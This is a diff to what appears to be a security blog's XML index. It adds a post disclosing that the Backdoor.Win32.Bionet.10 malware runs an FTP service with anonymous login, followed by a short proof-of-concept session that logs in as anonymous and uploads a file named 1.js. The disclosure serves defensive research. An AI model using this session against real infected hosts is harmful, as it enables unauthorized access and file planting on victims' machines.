@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>Backdoor.Win32.Bionet.10 Anonymous Login</title>
+    <link href="/2021/02/21/Backdoor-Win32-Bionet-10-Anonymous-Login/"/>
+    <url>/2021/02/21/Backdoor-Win32-Bionet-10-Anonymous-Login/</url>
+    
+    <content type="html"><![CDATA[<h4 id="Backdoor-Win32-Bionet-10-Anonymous-Login"><a href="#Backdoor-Win32-Bionet-10-Anonymous-Login" class="headerlink" title="Backdoor.Win32.Bionet.10 Anonymous Login"></a>Backdoor.Win32.Bionet.10 Anonymous Login</h4><p>Backdoor.Win32.Bionet.10 malware has an ftp service that allows for anonymous login.</p><p>Exploit/PoC:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">TELNET</span> x.x.x.x <span class="hljs-number">12348</span><br><br><span class="hljs-attribute">220</span> BNFTP Server ready.                                                                                           <br><span class="hljs-attribute">USER</span> anonymous                                                                                                    <br><span class="hljs-attribute">331</span> Password required for anonymous.                                                                              <br><span class="hljs-attribute">PASS</span> anonymous                                                                                                    <br><span class="hljs-attribute">230</span> User anonymous logged in.                                                                                                                                                                          <br><span class="hljs-attribute">PASV</span>                                                                                                              <br><span class="hljs-attribute">227</span> Entering Passive Mode (<span class="hljs-number">192</span>,<span class="hljs-number">168</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">194</span>,<span class="hljs-number">160</span>).                                                               <br><span class="hljs-attribute">STOR</span> <span class="hljs-number">1</span>.js                                                                                                         <br><span class="hljs-attribute">150</span> Opening data connection for <span class="hljs-number">1</span>.js.                                                                             <br><span class="hljs-attribute">PASV</span>                                                                                                              <br><span class="hljs-attribute">226</span> File received ok                                                                                              <br><span class="hljs-attribute">227</span> Entering Passive Mode (<span class="hljs-number">192</span>,<span class="hljs-number">168</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">194</span>,<span class="hljs-number">162</span>).<br></code></pre></div></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Exploit</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Anonymous Login</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>VSCode install on kali</title>
     <link href="/2021/02/11/VScode-install-on-kali/"/>
     <url>/2021/02/11/VScode-install-on-kali/</url>
